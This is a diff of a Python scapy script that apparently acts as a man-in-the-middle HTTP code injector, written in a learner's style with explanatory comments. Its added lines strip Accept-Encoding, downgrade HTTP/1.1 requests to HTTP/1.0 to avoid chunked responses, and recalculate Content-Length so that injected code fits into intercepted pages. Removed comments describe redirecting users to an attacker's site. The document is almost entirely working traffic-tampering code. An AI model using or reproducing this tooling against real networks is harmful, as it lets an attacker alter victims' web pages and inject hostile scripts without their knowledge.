@@ -36,7 +36,17 @@ def process_packet(packet):
             # this chooses Accept-Encoding: then a number of characters, then ? is for non greedy
             # then a \r and \n. the \\ is because \ is spl char
             modified_load = re.sub("Accept-Encoding:.*?\\n", "", load_str)
+            print("[+] Removed Encoding")
             # replacing our Accept-Encoding:.*?\\r\\n with nothing, ie removing it
+            modified_load = modified_load.replace("HTTP/1.1", "HTTP/1.0")
+            print("[+] Changed HTTP 1.1 to HTTP 1.0")
+            # we might notice that the websites do not load properly
+            # This happens when HTTP 1.1 is used 
+            # This allows Server to send responses in chunks
+            # This causes error in recalculating page length
+            # So instead of using HTTP 1.1 which gives out in chunks
+            # We'll sedit the response as well and send out the request in 1.0
+            # and HTTP 1.0 does not use chunks so our program will work
 
         elif scapy_packet[scapy.TCP].sport == 80:
             # we're checking if it's a response
@@ -47,24 +57,19 @@ def process_packet(packet):
                 content_len = content_len.group(1)
                 new_len = int(content_len) + len(code)
                 modified_load = modified_load.replace(content_len, str(new_len))
+                print("[+] Modified Length of page")
 
         if load_str != scapy_packet[scapy.Raw].load:
             mod_pack = set_load(scapy_packet, modified_load.encode())
             # print(mod_pack)
             packet.set_payload(bytes(mod_pack))
-
+            
+    print("[+] Spoof complete")
     packet.accept()
 
 
 def set_load(packet, load):
-    # https://en.wikipedia.org/wiki/List_of_HTTP_status_codes this is the list of HTTP status codes
-    # what we wanna do, is redirect the user from the target site to our own site.
-    # HTTP/1.1 301 Moved P
-    # Permanently Location: target website
-    # this is what we want, the new line is important
-
     packet[scapy.Raw].load = load
-    # the extra \n characters are so that nothing clutters the location field
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
